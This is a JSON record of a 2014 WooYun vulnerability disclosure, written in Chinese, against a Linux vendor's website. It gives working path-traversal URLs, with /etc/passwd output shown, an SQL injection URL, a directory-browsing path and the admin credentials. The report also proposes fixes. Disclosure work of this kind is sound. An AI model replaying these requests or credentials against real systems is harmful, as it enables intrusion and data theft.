{"id": 48901, "wybug_id": "wooyun-2014-081207", "wybug_title": "国产操作系统厂商spglinux官网漏洞合集", "wybug_corp": "spgnux.com", "wybug_author": "xorop", "wybug_date": "2014-10-29 15:56", "wybug_open_date": "2014-12-13 15:58", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "数字类型注射", "任意文件下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-12-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 看到篇新闻，http://www.cnbeta.com/articles/341029.htm，不信邪。大体测试了下，发现一堆漏洞和敏感信息泄露。 详细说明：  包括：任意文件下载，SQL注入，弱口令等等。这样一家公司搞的操作系统实在不怎么看好啊。找到操作系统下载地址下下来装上试试吧，貌似所有序列号都在呢。   漏洞证明：  问题一：任意文件下载漏洞发现一个操作系统下载的链接：\n\nhttp://www.spgnux.com/Public/Uploads/download/1.php?dd=iso/201004240914478.iso尝试构造跳转链接：http://www.spgnux.com/Public/Uploads/download/1.php?dd=/etc/passwd结果发现很温馨的提供了各种绝对路径和想要的文件内容\n<br /><b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/spg/Public/Uploads/download/1.php:1) in <b>/var/www/html/spg/Public/Uploads/download/1.php</b> on line <b>13</b><br /><br /><b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/spg/Public/Uploads/download/1.php:1) in <b>/var/www/html/spg/Public/Uploads/download/1.php</b> on line <b>14</b><br /><br /><b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/spg/Public/Uploads/download/1.php:1) in <b>/var/www/html/spg/Public/Uploads/download/1.php</b> on line <b>15</b><br /><br /><b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/spg/Public/Uploads/download/1.php:1) in <b>/var/www/html/spg/Public/Uploads/download/1.php</b> on line <b>16</b><br />root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashpcap:x:77:77::/var/arpwatch:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinhsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinqemu:x:100:159:qemu user:/:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:101:160:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologingdm:x:42:42::/var/gdm:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologin\n其他文件通过尝试后发现都能正常读取。http://www.spgnux.com/Public/Uploads/download/1.php?dd=/etc/httpd/conf/httpd.conf获取到了所有的虚拟主机配置和路径。\n\n然后发现了站点的tar.gz备份文件，通过这个地址继续下载www.spgnux.com/Public/Uploads/download/1.php?dd=/var/www/html/edu.tar.gz去掉头部后解压该文件，发现是DXCCMS的源码。懒得看了，继续寻找有用的信息。问题二：注入漏洞及弱口令根据上面的信息找到了一个注入地址：http://hcc.spgnux.com/home/index/index/tep/9?id=1\n\n\n\n\n\n发现了什么，弱口令有木有，而且所有数据库都能看到问题三：在线文件浏览器上面得到了cms的密码，登录进去看看吧http://www.spgnux.com/admin用户名密码为admin/spglinux登陆后简单看了下，发现个地址http://www.spgnux.com/admin/main/catalogadd/dd/d2/mo/lanm?dxcGCd1=/../../../../..好东西啊，整个服务器文件随便看了到此结束了，不做坏事   修复方案：  过滤、用好Thinkphp的安全功能，服务器权限需要调整更重要的是你得好好做做操作系统啊，现在用的是centos   版权声明：转载请注明来源 xorop@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-10-29 23:17 |    \t\t宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:33        | 我是好宝宝)\t\t \n  洞主是不是看了那个云南政府采购操作系统的新闻？其实这家公司的linux貌似很多年没更新了，估计也是个骗钱的公司    \n     2014-11-02 15:46 |    \t\txorop \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | xxoo!!)\t\t \n  不用估计了，服务器上的iso文件、pdf文件等各种稍微专业点得文件都是20多k得假文件，服务器没有任何安全配置，社工调查了下这个集团此业务的相关人员，绝对是个大坑。。。    \n     2014-11-02 15:47 |    \t\txorop \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | xxoo!!)\t\t \n  @宝宝 不用估计了，服务器上的iso文件、pdf文件等各种稍微专业点得文件都是20多k得假文件，服务器没有任何安全配置，社工调查了下这个集团此业务的相关人员，绝对是个大坑。。    \n     2014-11-02 19:28 |    \t\t宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:33        | 我是好宝宝)\t\t \n  所以说我们国家要自主做系统就是个笑话，什么麒麟，红旗，都是为了骗国家的钱，骗纳税人的钱    \n     2014-12-13 16:03 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @宝宝 @xorop 元心那个操作系统不知道你们看过木有    \n     2014-12-13 18:35 |    \t\tkeeley \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:7        | 珍惜生命，远离黑阔)\t\t \n  Hacked by xoropBlog http://xorop.meIgnore you?洞主，我只想说： you are so diao !    \n     2014-12-14 03:09 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  Hacked by xorop    CCTV看这里   看这里    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}